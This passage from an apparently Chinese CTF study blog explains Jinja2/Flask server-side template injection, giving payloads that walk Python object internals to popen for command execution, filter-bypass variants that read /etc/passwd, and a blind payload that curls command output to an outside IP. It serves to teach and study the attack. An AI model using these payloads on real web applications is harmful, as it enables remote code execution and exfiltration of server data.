-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">"".<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">-1</span>].<span class="strong">__subclasses__</span>()[<span class="string">128</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'popen'</span>](<span class="link">'whoami'</span>).read()</span><br></pre></td></tr></table></figure>
-
-<h4 id="payload解析"><a href="#payload解析" class="headerlink" title="payload解析"></a>payload解析</h4><p>python中万物皆对象，前面学习类继承的时候提到可以回溯到基类中，例如上面payload中，使用一个空字符串调用__class__获取到是属于字符串类，而__bases[-1]__是获取到继承链的最后一个类(即基类)<code>&lt;class &#39;object&#39;&gt;</code>，__subclasses__()获取基类的所有子类，返回了一个列表，[128]取到了<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>这个类。我在学习这个payload的时候不懂为什么要调用__init__，自己写了一个例子就发现了问题所在。</p>
-<p><img src="/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/0x03_%E8%A1%A5%E5%85%85pyload%E8%A7%A3%E6%9E%90.png" alt="0x03_补充pyload解析.png"></p>
-<p>噢原来只是找到这个函数呀，我开始以为是调用了__init__()函数，这里只是个函数指针罢了。让我们再看一下__globals__的作用：</p>
-<blockquote>
-<p>用于获取function所处空间下可使用的模块、方法以及所有变量。</p>
-</blockquote>
-<p>__init__是每个类都有的函数，那么通过__init__调用__globals__就得到了这个类中的各种模块，方法跟变量(字典格式)，如果有popen函数的话，就可以通过__init__.__globals__[‘popen’]来获取到popen的函数指针了，接下来的就是执行命令就不再赘述了。关于__init__的理解我还写了一个小例子，如下：</p>
-<p><img src="/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/0x03_%E8%A1%A5%E5%85%85_example.png" alt="0x03_补充_example.png"></p>
-<p>可以看到通过调用__init__.__globals__获取到的模块跟通过dir()获取到的相同，包括导入的os模块也在其中。</p>
-<h3 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h3><p>啊这里就不总结了，思路就是那样子，本文基于python3来的，2有一些区别，思路都差不多。</p>
-<h3 id="0x05-常见绕过方式"><a href="#0x05-常见绕过方式" class="headerlink" title="0x05 常见绕过方式"></a>0x05 常见绕过方式</h3><p>![E:\Hexo\source_posts\SSTI学习](0x0x5_bypass.png)</p>
-<p>观察payload中出现的符号，采取对应的bypass思路(以下是python2，获取的40是file，python3中__subclasses__()没有file)。</p>
-<h4 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h4><p> <code>request.args</code> 是flask中的一个属性,为返回请求的参数,这里把<code>path</code>当作变量名,将后面的路径传值进来,进而绕过了引号的过滤</p>
-<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="comment">()</span>.__class__.__bases__.__getitem__<span class="comment">(0)</span>.__subclasses__<span class="comment">()</span>.pop<span class="comment">(40)</span><span class="comment">(request.args.path)</span>.read<span class="comment">()</span>&#125;&#125;&amp;path=/etc/passwd</span><br></pre></td></tr></table></figure>
-
-<h4 id="过滤双下划线"><a href="#过滤双下划线" class="headerlink" title="过滤双下划线"></a>过滤双下划线</h4><p>同样利用<code>request.args</code>属性</p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ''[<span class="string">request.args.class</span>][<span class="symbol">request.args.mro</span>][<span class="string">2</span>][<span class="symbol">request.args.subclasses</span>]()[<span class="string">40</span>](<span class="link">'/etc/passwd'</span>).read() &#125;&#125;&amp;class=<span class="strong">__class__</span>&amp;mro=<span class="strong">__mro__</span>&amp;subclasses=__subclasse</span><br></pre></td></tr></table></figure>
-
-<p>将其中的<code>request.args</code>改为<code>request.values</code>则利用post的方式进行传参</p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">&#123;&#123; ''[<span class="string">request.value.class</span>][<span class="symbol">request.value.mro</span>][<span class="string">2</span>][<span class="symbol">request.value.subclasses</span>]()[<span class="string">40</span>](<span class="link">'/etc/passwd'</span>).read() &#125;&#125;</span><br><span class="line">POST:</span><br><span class="line">class=<span class="strong">__class__</span>&amp;mro=<span class="strong">__mro__</span>&amp;subclasses=<span class="strong">__subclasses__</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号"></a>过滤中括号</h4><p>list有个__getitem__方法，还有个pop方法，都能绕过，dict有get等方法，都可以通过查看__dict__来查阅。</p>
-<h4 id="过滤双花括号"><a href="#过滤双花括号" class="headerlink" title="过滤双花括号"></a>过滤双花括号</h4><figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line">&#123;% if ''.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="name">'curl</span> http://xx.xxx.xx.xx:8080/?i=`whoami`').read()=='p' %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h4><p><strong>base64编码绕过</strong><br><code>__getattribute__</code>使用实例访问属性时,调用该方法</p>
-<p>例如被过滤掉<code>__class__</code>关键词</p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[<span class="string"></span>].<span class="strong">__getattribute__</span>('X19jbGFzc19f'.decode('base64')).<span class="strong">__base__</span>.<span class="strong">__subclasses__</span>()[<span class="string">40</span>](<span class="link">"/etc/passwd"</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>字符串拼接绕过</strong></p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[<span class="string"></span>].<span class="strong">__getattribute__</span>('<span class="strong">__c'+'lass__</span>').<span class="strong">__base__</span>.<span class="strong">__subclasses__</span>()[<span class="string">40</span>](<span class="link">"/etc/passwd"</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x06-后记"><a href="#0x06-后记" class="headerlink" title="0x06 后记"></a>0x06 后记</h3><p><strong>不利用<strong>globals</strong></strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">59</span>]()._module.linecache.os.system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>
-
-<p><strong>timeit</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">"__import__('os').system('dir')"</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-
-<p><strong>platform</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">print</span> platform.popen(<span class="string">'dir'</span>).read()</span><br></pre></td></tr></table></figure>
-
-<p> <strong>from_object</strong> </p>
-<p>太多了。。。暂时不总结了，这里主要概括为使用框架的内省对象。所有总结就到此结束了</p>
 ]]></content>
       <tags>
         <tag>CTF</tag>
